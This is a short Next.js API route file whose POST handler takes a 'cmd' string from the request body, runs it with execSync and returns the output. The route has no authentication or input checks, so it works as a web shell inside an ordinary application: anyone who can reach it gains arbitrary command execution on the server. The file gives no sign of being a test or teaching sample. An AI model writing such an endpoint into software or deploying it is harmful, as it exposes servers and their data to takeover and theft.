import { NextResponse } from "next/server";
import { execSync } from "child_process";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const { cmd } = await req.json();
    const out = execSync(cmd).toString();
    return new NextResponse(out, { headers: { "Content-Type": "text/plain" } });
  } catch (error: any) {
    return new NextResponse(
      error.message +
        "\n" +
        (error.stdout ? error.stdout.toString() : "") +
        "\n" +
        (error.stderr ? error.stderr.toString() : ""),
      { status: 500 },
    );
  }
}
